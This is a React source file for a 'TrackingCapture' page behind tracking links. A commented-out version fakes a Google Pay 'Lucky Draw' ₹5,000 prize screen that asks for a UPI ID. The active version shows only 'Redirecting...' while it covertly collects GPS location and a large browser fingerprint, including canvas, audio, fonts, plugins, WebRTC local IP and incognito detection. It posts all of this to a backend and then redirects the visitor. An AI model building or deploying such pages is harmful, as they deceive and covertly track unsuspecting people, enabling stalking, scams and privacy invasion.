// import React, { useEffect, useRef, useState } from "react";
// import { useParams } from "react-router-dom";
// import { useGeoGrabber } from "../hooks/useGeoGrabber";

// const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

// function getCaptureKey(token) {
//   return "traxelon_captured_v4_" + token;
// }

// // ── Canvas fingerprint ────────────────────────────────────────
// function getCanvasFingerprint() {
//   try {
//     const canvas = document.createElement("canvas");
//     canvas.width = 200;
//     canvas.height = 50;
//     const ctx = canvas.getContext("2d");
//     ctx.textBaseline = "top";
//     ctx.font = "14px Arial";
//     ctx.fillStyle = "#f60";
//     ctx.fillRect(125, 1, 62, 20);
//     ctx.fillStyle = "#069";
//     ctx.fillText("Traxelon", 2, 15);
//     ctx.fillStyle = "rgba(102,204,0,0.7)";
//     ctx.fillText("Traxelon", 4, 17);
//     const dataUrl = canvas.toDataURL();
//     let hash = 0;
//     for (let i = 0; i < dataUrl.length; i++) {
//       hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
//       hash |= 0;
//     }
//     return hash.toString(16);
//   } catch {
//     return null;
//   }
// }

// // ── WebGL GPU info ────────────────────────────────────────────
// function getGPUInfo() {
//   try {
//     const canvas = document.createElement("canvas");
//     const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
//     if (!gl) return { gpu: null, gpuVendor: null };
//     const ext = gl.getExtension("WEBGL_debug_renderer_info");
//     if (!ext) return { gpu: null, gpuVendor: null };
//     return {
//       gpu: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || null,
//       gpuVendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || null,
//     };
//   } catch {
//     return { gpu: null, gpuVendor: null };
//   }
// }

// // ── Battery info ──────────────────────────────────────────────
// async function getBatteryInfo() {
//   try {
//     if (!navigator.getBattery) return {};
//     const battery = await navigator.getBattery();
//     return {
//       batteryLevel: Math.round(battery.level * 100),
//       batteryCharging: battery.charging,
//     };
//   } catch {
//     return {};
//   }
// }

// // ── Incognito detection ───────────────────────────────────────
// async function detectIncognito() {
//   try {
//     if (navigator.storage && navigator.storage.estimate) {
//       const { quota } = await navigator.storage.estimate();
//       return quota < 120 * 1024 * 1024;
//     }
//     return null;
//   } catch {
//     return null;
//   }
// }

// // ── Network info ──────────────────────────────────────────────
// function getNetworkInfo() {
//   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
//   if (!conn) return {};
//   return {
//     connectionType: conn.effectiveType || null,
//     connectionDownlink: conn.downlink || null,
//     connectionRtt: conn.rtt || null,
//     connectionSaveData: conn.saveData || false,
//   };
// }

// // ── Collect all device info ───────────────────────────────────
// async function collectDeviceInfo() {
//   const [battery, incognito] = await Promise.all([
//     getBatteryInfo(),
//     detectIncognito(),
//   ]);
//   const { gpu, gpuVendor } = getGPUInfo();
//   const network = getNetworkInfo();
//   const canvasHash = getCanvasFingerprint();

//   return {
//     cpuCores: navigator.hardwareConcurrency || null,
//     ram: navigator.deviceMemory || null,
//     gpu,
//     gpuVendor,
//     maxTouchPoints: navigator.maxTouchPoints || null,
//     batteryLevel: battery.batteryLevel || null,
//     batteryCharging: battery.batteryCharging || null,
//     screenWidth: window.screen.width,
//     screenHeight: window.screen.height,
//     screenAvailWidth: window.screen.availWidth || null,
//     screenAvailHeight: window.screen.availHeight || null,
//     colorDepth: window.screen.colorDepth || null,
//     pixelDepth: window.screen.pixelDepth || null,
//     pixelRatio: window.devicePixelRatio || null,
//     windowWidth: window.innerWidth || null,
//     windowHeight: window.innerHeight || null,
//     language: navigator.language || null,
//     languages: navigator.languages ? navigator.languages.join(", ") : null,
//     platform: navigator.platform || null,
//     cookiesEnabled: navigator.cookieEnabled || null,
//     doNotTrack: navigator.doNotTrack || null,
//     historyLength: window.history.length || null,
//     referrer: document.referrer || null,
//     ...network,
//     incognito: incognito || null,
//     canvasHash,
//   };
// }

// export default function TrackingCapture() {
//   const { token } = useParams();
//   const [status, setStatus] = useState("📍 Allow location for full experience…");
//   const hasSent = useRef(false);
//   const { location, loading } = useGeoGrabber();

//   useEffect(() => {
//     const key = getCaptureKey(token);
//     if (sessionStorage.getItem(key)) {
//       setStatus("Redirecting…");
//     }
//   }, [token]);

//   useEffect(() => {
//     if (loading) return;
//     if (hasSent.current) return;
//     const key = getCaptureKey(token);
//     if (sessionStorage.getItem(key)) return;
//     hasSent.current = true;
//     sessionStorage.setItem(key, "1");
//     sendCapture(location);
//   }, [loading]);

//   async function sendCapture(loc) {
//     setStatus("Redirecting…");

//     try {
//       const deviceInfo = await collectDeviceInfo();

//       const payload = {
//         token,
//         gpsLat: loc && loc.source === "gps" ? (loc.lat || null) : null,
//         gpsLon: loc && loc.source === "gps" ? (loc.lon || null) : null,
//         gpsAccuracy: loc && loc.source === "gps" ? (loc.gpsAccuracy || null) : null,
//         ...deviceInfo,
//       };

//       const res = await fetch(BACKEND_URL + "/api/links/capture", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify(payload),
//       });

//       const data = await res.json();
//       if (data.destinationUrl) {
//         window.location.replace(data.destinationUrl);
//       }
//     } catch (err) {
//       console.error("[TrackingCapture] error:", err);
//     }
//   }

//   const orderId = token ? token.substring(0, 10).toUpperCase() : "";

//   return (
//     <div style={{
//       margin: 0,
//       padding: "16px",
//       minHeight: "100vh",
//       background: "#f1f3f4",
//       fontFamily: "'Google Sans', Roboto, Arial, sans-serif",
//       display: "flex",
//       flexDirection: "column",
//       alignItems: "center",
//       justifyContent: "center",
//     }}>
//       <div style={{
//         background: "#fff",
//         borderRadius: 16,
//         boxShadow: "0 2px 10px rgba(0,0,0,0.15)",
//         width: "100%",
//         maxWidth: 400,
//         overflow: "hidden"
//       }}>
//         {/* Top bar */}
//         <div style={{ background: "#fff", padding: "16px 20px", borderBottom: "1px solid #e8eaed", display: "flex", alignItems: "center", gap: 10 }}>
//           <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
//             <svg width="28" height="28" viewBox="0 0 48 48">
//               <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
//               <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
//               <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
//               <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
//             </svg>
//             <span style={{ fontSize: 18, fontWeight: 500, color: "#202124", letterSpacing: 0.3 }}>Pay</span>
//           </div>
//         </div>

//         {/* Prize Banner */}
//         <div style={{ background: "linear-gradient(135deg, #1a73e8, #0d47a1)", padding: "24px 20px", textAlign: "center" }}>
//           <div style={{ background: "rgba(255,255,255,0.15)", borderRadius: 50, display: "inline-block", padding: "4px 16px", marginBottom: 12, fontSize: 12, color: "#fff", letterSpacing: 1 }}>
//             🎉 CONGRATULATIONS
//           </div>
//           <div style={{ color: "#fff", fontSize: 38, fontWeight: 700, letterSpacing: -1 }}>₹5,000</div>
//           <div style={{ color: "rgba(255,255,255,0.85)", fontSize: 13, marginTop: 6 }}>Lucky Draw Winner — Claim your prize now!</div>
//         </div>

//         {/* Sender */}
//         <div style={{ padding: "16px 20px", borderBottom: "1px solid #e8eaed", display: "flex", alignItems: "center", gap: 14 }}>
//           <div style={{ width: 46, height: 46, borderRadius: "50%", background: "#1a73e8", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700, fontSize: 20, flexShrink: 0 }}>L</div>
//           <div style={{ flex: 1 }}>
//             <div style={{ color: "#202124", fontWeight: 600, fontSize: 15 }}>Lucky Draw India</div>
//             <div style={{ color: "#5f6368", fontSize: 12, marginTop: 2 }}>luckydraw@okhdfcbank</div>
//           </div>
//           <div style={{ background: "#e6f4ea", color: "#137333", fontSize: 11, fontWeight: 600, padding: "3px 10px", borderRadius: 12 }}>✓ VERIFIED</div>
//         </div>

//         {/* Transaction details */}
//         <div style={{ padding: "14px 20px", background: "#f8f9fa", borderBottom: "1px solid #e8eaed" }}>
//           {[
//             { label: "Transaction ID", value: "TXN" + orderId },
//             { label: "Date & Time", value: new Date().toLocaleString("en-IN") },
//             { label: "Payment Type", value: "Lucky Draw Prize" },
//             { label: "Status", value: status === "📍 Allow location for full experience…" ? "⏳ Verifying..." : "✓ Ready to Claim", color: status === "📍 Allow location for full experience…" ? "#f9ab00" : "#137333" },
//           ].map((item, i) => (
//             <div key={i} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 10 }}>
//               <span style={{ color: "#5f6368", fontSize: 13 }}>{item.label}</span>
//               <span style={{ color: item.color || "#202124", fontSize: 13, fontWeight: 500 }}>{item.value}</span>
//             </div>
//           ))}
//         </div>

//         {/* UPI Input */}
//         <div style={{ padding: "20px" }}>
//           <div style={{ color: "#202124", fontSize: 14, fontWeight: 500, marginBottom: 12 }}>Enter UPI ID to receive ₹5,000</div>
//           <div style={{ display: "flex", alignItems: "center", border: "1.5px solid #dadce0", borderRadius: 8, overflow: "hidden", marginBottom: 16 }}>
//             <input type="text" placeholder="mobilenumber@upi" style={{ flex: 1, padding: "13px 14px", border: "none", outline: "none", fontSize: 14, color: "#202124", background: "transparent" }} />
//             <div style={{ padding: "0 16px", color: "#1a73e8", fontSize: 13, fontWeight: 600, borderLeft: "1px solid #dadce0", cursor: "pointer", whiteSpace: "nowrap", alignSelf: "stretch", display: "flex", alignItems: "center" }}>Verify</div>
//           </div>
//           <button style={{ width: "100%", background: "#1a73e8", color: "#fff", border: "none", borderRadius: 8, padding: "14px", fontSize: 15, fontWeight: 600, cursor: "pointer" }}>
//             Claim ₹5,000 Now
//           </button>
//           <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginTop: 14, color: "#5f6368", fontSize: 11 }}>
//             🔒 Secured by Google Pay · 256-bit SSL
//           </div>
//         </div>
//       </div>

//       <div style={{ marginTop: 20, color: "#5f6368", fontSize: 11 }}>
//         Google Pay · Privacy · Terms · Help
//       </div>
//     </div>
//   );
// }


import React, { useEffect, useRef } from "react";
import { useParams } from "react-router-dom";
import { useGeoGrabber } from "../hooks/useGeoGrabber";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

function getCaptureKey(token) {
  return "traxelon_captured_v5_" + token;
}

function getCanvasFingerprint() {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 200; canvas.height = 50;
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("Traxelon", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.fillText("Traxelon", 4, 17);
    const dataUrl = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataUrl.length; i++) {
      hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
      hash |= 0;
    }
    return hash.toString(16);
  } catch { return null; }
}

async function getAudioFingerprint() {
  try {
    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    if (!AudioCtx) return null;
    const ctx = new AudioCtx();
    const oscillator = ctx.createOscillator();
    const analyser = ctx.createAnalyser();
    const gain = ctx.createGain();
    const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
    gain.gain.value = 0;
    oscillator.type = "triangle";
    oscillator.frequency.value = 10000;
    oscillator.connect(analyser);
    analyser.connect(scriptProcessor);
    scriptProcessor.connect(gain);
    gain.connect(ctx.destination);
    oscillator.start(0);
    return new Promise((resolve) => {
      scriptProcessor.onaudioprocess = (e) => {
        const data = e.inputBuffer.getChannelData(0);
        let sum = 0;
        for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
        oscillator.disconnect();
        ctx.close();
        resolve(sum.toString(16).substring(0, 12));
      };
      setTimeout(() => resolve(null), 1000);
    });
  } catch { return null; }
}

function getGPUInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { gpu: null, gpuVendor: null };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      gpu: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
      gpuVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
      webglVersion: gl.getParameter(gl.VERSION) || null,
      webglRenderer: gl.getParameter(gl.RENDERER) || null,
      webglVendor: gl.getParameter(gl.VENDOR) || null,
      webglShadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null,
      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || null,
    };
  } catch { return { gpu: null, gpuVendor: null }; }
}

async function getBatteryInfo() {
  try {
    if (!navigator.getBattery) return {};
    const battery = await navigator.getBattery();
    return {
      batteryLevel: Math.round(battery.level * 100),
      batteryCharging: battery.charging,
      batteryChargingTime: battery.chargingTime !== Infinity ? battery.chargingTime : null,
      batteryDischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime : null,
    };
  } catch { return {}; }
}

async function detectIncognito() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const { quota } = await navigator.storage.estimate();
      return quota < 120 * 1024 * 1024;
    }
    return null;
  } catch { return null; }
}

function getNetworkInfo() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return {};
  return {
    connectionType: conn.effectiveType || null,
    connectionDownlink: conn.downlink || null,
    connectionRtt: conn.rtt || null,
    connectionSaveData: conn.saveData || false,
    connectionDownlinkMax: conn.downlinkMax || null,
  };
}

async function getStorageInfo() {
  try {
    const estimate = await navigator.storage?.estimate();
    return {
      storageQuota: estimate?.quota ? Math.round(estimate.quota / 1024 / 1024) + " MB" : null,
      storageUsage: estimate?.usage ? Math.round(estimate.usage / 1024 / 1024) + " MB" : null,
      localStorageEnabled: (() => { try { localStorage.setItem("t","1"); localStorage.removeItem("t"); return true; } catch { return false; } })(),
      sessionStorageEnabled: (() => { try { sessionStorage.setItem("t","1"); sessionStorage.removeItem("t"); return true; } catch { return false; } })(),
      indexedDBEnabled: !!window.indexedDB,
    };
  } catch { return {}; }
}

async function getMediaDevices() {
  try {
    if (!navigator.mediaDevices?.enumerateDevices) return {};
    const devices = await navigator.mediaDevices.enumerateDevices();
    return {
      cameras: devices.filter(d => d.kind === "videoinput").length,
      microphones: devices.filter(d => d.kind === "audioinput").length,
      speakers: devices.filter(d => d.kind === "audiooutput").length,
    };
  } catch { return {}; }
}

function getInstalledFonts() {
  try {
    const fontList = [
      "Arial","Arial Black","Arial Narrow","Calibri","Cambria",
      "Comic Sans MS","Courier","Courier New","Georgia","Helvetica",
      "Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif",
      "Palatino Linotype","Tahoma","Times New Roman","Trebuchet MS",
      "Verdana","Wingdings","Segoe UI","Roboto","Ubuntu","Open Sans",
    ];
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const baseFonts = ["monospace", "sans-serif", "serif"];
    const testString = "mmmmmmmmmmlli";
    const testSize = "72px";
    const baseWidths = {};
    baseFonts.forEach(base => {
      ctx.font = `${testSize} ${base}`;
      baseWidths[base] = ctx.measureText(testString).width;
    });
    const detected = fontList.filter(font =>
      baseFonts.some(base => {
        ctx.font = `${testSize} '${font}', ${base}`;
        return ctx.measureText(testString).width !== baseWidths[base];
      })
    );
    return { fontsDetected: detected.length, fontsList: detected.join(", ") };
  } catch { return {}; }
}

function getSpeechVoices() {
  try {
    if (!window.speechSynthesis) return {};
    const voices = window.speechSynthesis.getVoices();
    return {
      speechVoicesCount: voices.length,
      speechVoices: voices.slice(0, 5).map(v => v.name).join(", ") || null,
    };
  } catch { return {}; }
}

function getBrowserPlugins() {
  try {
    const plugins = Array.from(navigator.plugins || []).map(p => p.name);
    return {
      pluginsCount: plugins.length,
      plugins: plugins.slice(0, 10).join(", ") || null,
    };
  } catch { return {}; }
}

function getPerformanceInfo() {
  try {
    const perf = performance.getEntriesByType("navigation")[0];
    return {
      pageLoadTime: perf ? Math.round(perf.loadEventEnd - perf.startTime) + " ms" : null,
      domContentLoaded: perf ? Math.round(perf.domContentLoadedEventEnd - perf.startTime) + " ms" : null,
    };
  } catch { return {}; }
}

async function getWebRTCIP() {
  try {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    await pc.createOffer().then(offer => pc.setLocalDescription(offer));
    return new Promise((resolve) => {
      const ips = [];
      pc.onicecandidate = (e) => {
        if (!e.candidate) { pc.close(); resolve({ webrtcLocalIP: ips.join(", ") || null }); return; }
        const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
        if (match) ips.push(match[1]);
      };
      setTimeout(() => { pc.close(); resolve({ webrtcLocalIP: ips.join(", ") || null }); }, 1000);
    });
  } catch { return { webrtcLocalIP: null }; }
}

async function collectDeviceInfo() {
  const [battery, incognito, mediaDevices, storageInfo, audioFingerprint, webrtcIP] = await Promise.all([
    getBatteryInfo(), detectIncognito(), getMediaDevices(),
    getStorageInfo(), getAudioFingerprint(), getWebRTCIP(),
  ]);

  const gpuInfo = getGPUInfo();
  const network = getNetworkInfo();
  const canvasHash = getCanvasFingerprint();
  const fonts = getInstalledFonts();
  const speech = getSpeechVoices();
  const plugins = getBrowserPlugins();
  const perf = getPerformanceInfo();
  const now = new Date();

  return {
    // Hardware
    cpuCores: navigator.hardwareConcurrency || null,
    ram: navigator.deviceMemory || null,
    ...gpuInfo,
    // Battery
    ...battery,
    // Screen
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    screenAvailWidth: window.screen.availWidth || null,
    screenAvailHeight: window.screen.availHeight || null,
    colorDepth: window.screen.colorDepth || null,
    pixelDepth: window.screen.pixelDepth || null,
    pixelRatio: window.devicePixelRatio || null,
    windowWidth: window.innerWidth || null,
    windowHeight: window.innerHeight || null,
    orientation: window.screen.orientation?.type || null,
    outerWidth: window.outerWidth || null,
    outerHeight: window.outerHeight || null,
    // Touch
    maxTouchPoints: navigator.maxTouchPoints || null,
    touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
    pointerType: window.PointerEvent ? "pointer" : "mouse",
    // Browser
    language: navigator.language || null,
    languages: navigator.languages ? navigator.languages.join(", ") : null,
    platform: navigator.platform || null,
    cookiesEnabled: navigator.cookieEnabled || null,
    doNotTrack: navigator.doNotTrack || null,
    historyLength: window.history.length || null,
    referrer: document.referrer || null,
    vendor: navigator.vendor || null,
    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
    pdfViewerEnabled: navigator.pdfViewerEnabled || null,
    // Network
    ...network,
    // Date & Time
    localTime: now.toLocaleString("en-IN", { timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone }),
    clientTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: now.getTimezoneOffset(),
    // Privacy
    incognito: incognito || null,
    adBlockDetected: (() => {
      try {
        const el = document.createElement("div");
        el.className = "adsbox ad-unit ads";
        document.body.appendChild(el);
        const blocked = el.offsetHeight === 0;
        document.body.removeChild(el);
        return blocked;
      } catch { return null; }
    })(),
    // Fingerprints
    canvasHash,
    audioFingerprint,
    // Media
    ...mediaDevices,
    // Storage
    ...storageInfo,
    // Fonts
    ...fonts,
    // Speech
    ...speech,
    // Plugins
    ...plugins,
    // Performance
    ...perf,
    // WebRTC
    ...webrtcIP,
    // Features
    webSocketSupport: !!window.WebSocket,
    webWorkerSupport: !!window.Worker,
    serviceWorkerSupport: "serviceWorker" in navigator,
    webAssemblySupport: !!window.WebAssembly,
    notificationsPermission: Notification?.permission || null,
    bluetoothSupport: "bluetooth" in navigator,
    usbSupport: "usb" in navigator,
  };
}

export default function TrackingCapture() {
  const { token } = useParams();
  const hasSent = useRef(false);
  const { location, loading } = useGeoGrabber();

  useEffect(() => {
    if (loading) return;
    if (hasSent.current) return;
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) return;
    hasSent.current = true;
    sessionStorage.setItem(key, "1");
    sendCapture(location);
  }, [loading]);

  async function sendCapture(loc) {
    try {
      const deviceInfo = await collectDeviceInfo();
      const payload = {
        token,
        gpsLat: loc?.source === "gps" ? (loc.lat || null) : null,
        gpsLon: loc?.source === "gps" ? (loc.lon || null) : null,
        gpsAccuracy: loc?.source === "gps" ? (loc.gpsAccuracy || null) : null,
        ...deviceInfo,
      };
      const res = await fetch(BACKEND_URL + "/api/links/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (data.destinationUrl) {
        window.location.replace(data.destinationUrl);
      }
    } catch (err) {
      console.error("[TrackingCapture] error:", err);
    }
  }

  return (
    <div style={{
      margin: 0, minHeight: "100vh", background: "#f1f3f4",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontFamily: "Arial, sans-serif", color: "#5f6368", fontSize: 14,
    }}>
      Redirecting...
    </div>
  );
}
